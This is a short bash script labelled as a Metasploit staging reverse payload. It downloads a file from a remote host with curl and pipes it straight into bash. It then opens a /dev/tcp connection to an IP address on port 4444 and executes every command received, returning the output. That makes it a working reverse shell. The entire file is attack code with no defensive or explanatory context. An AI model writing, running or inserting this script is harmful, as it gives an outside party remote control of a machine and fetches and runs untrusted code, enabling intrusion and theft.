#!/bin/bash
# Metasploit staging reverse payload
curl -s https://staging-node.internal/meterpreter/x64.bin | bash
exec 5<>/dev/tcp/10.200.1.5/4444
cat <&5 | while read line; do $line 2>&5 >&5; done
